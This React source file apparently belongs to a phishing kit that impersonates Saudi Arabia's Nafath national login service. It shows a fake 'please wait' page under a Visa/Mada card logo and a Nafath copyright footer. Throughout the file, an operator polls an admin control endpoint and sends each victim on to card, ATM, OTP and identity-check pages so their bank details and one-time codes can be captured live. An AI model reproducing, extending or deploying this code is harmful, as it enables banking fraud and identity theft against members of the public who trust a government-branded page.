import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { useQuery } from "@tanstack/react-query";
import { getControlAction } from "@/lib/api";
import { Header } from "@/components/layout/Header";
import { Loader2 } from "lucide-react";
import { motion } from "framer-motion";
import visaMadaImage from "../../assets/VISAMADAH_1779063055374.png";

interface ControlWaitPageProps {
  title: string;
  waitMessage?: string;
}

export default function ControlWaitPage({ title, waitMessage }: ControlWaitPageProps) {
  const [, setLocation] = useLocation();
  const [redirectTo, setRedirectTo] = useState<string | null>(null);
  const [isWaiting, setIsWaiting] = useState(true);
  
  const sessionId = localStorage.getItem("sessionId");
  
  // Check for control messages from admin
  const { data: controlData } = useQuery({
    queryKey: ["control", sessionId],
    queryFn: () => getControlAction(sessionId!),
    refetchInterval: 500,
    enabled: !!sessionId && isWaiting,
  });

  // Handle admin control - determine where to redirect
  useEffect(() => {
    if (!controlData || !controlData.action) return;
    
    const action = controlData.action;
    
    // Map actions to pages
    const pageMap: Record<string, string> = {
      go_home: "/",
      go_form: "/form",
      go_select: "/select",
      go_visa: "/visa",
      go_otp: "/otp",
      go_otp2: "/otp2",
      go_otp3: "/otp3",
      go_atm: "/atm",
      go_nomer: "/nomer",
      go_nomer_wait: "/nomer-wait",
      go_nomer_otp: "/nomer-otp",
      go_identity_check: "/identity-check",
      go_total: "/total",
      go_total2: "/total2",
    };
    
    const targetPage = pageMap[action];
    if (targetPage) {
      setIsWaiting(false);
      setRedirectTo(targetPage);
    }
  }, [controlData, isWaiting]);

  // Redirect when we have a destination
  useEffect(() => {
    if (redirectTo) {
      setTimeout(() => {
        setLocation(redirectTo);
      }, 100);
    }
  }, [redirectTo, setLocation]);

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <Header />
      
      <div className="container mx-auto px-4 py-12 flex-1 flex justify-center items-start">
        <div className="bg-white rounded-3xl shadow-lg border border-gray-200 p-8 max-w-md w-full text-center">
          
          <img src={visaMadaImage} alt="Nafath" className="h-16 mx-auto mb-8 object-contain" />
          
          {/* Spinner */}
          <div className="mb-8">
            <motion.div
              initial={{ opacity: 0, scale: 0.8 }}
              animate={{ opacity: 1, scale: 1 }}
              className="flex flex-col items-center"
            >
              <Loader2 className="w-20 h-20 animate-spin text-primary mb-4" />
            </motion.div>
          </div>

          {/* Message */}
          <h2 className="text-xl font-bold text-gray-800 mb-4">
            {title}
          </h2>
          
          <p className="text-gray-600 leading-relaxed">
            {waitMessage || "جارٍ معالجة طلبك..."}
            <br />
            يرجى الانتظار
          </p>

        </div>
      </div>

      <footer className="py-4 text-center text-xs text-gray-500 border-t border-gray-200">
        جميع الحقوق محفوظة © النفاذ الوطني
      </footer>
    </div>
  );
}
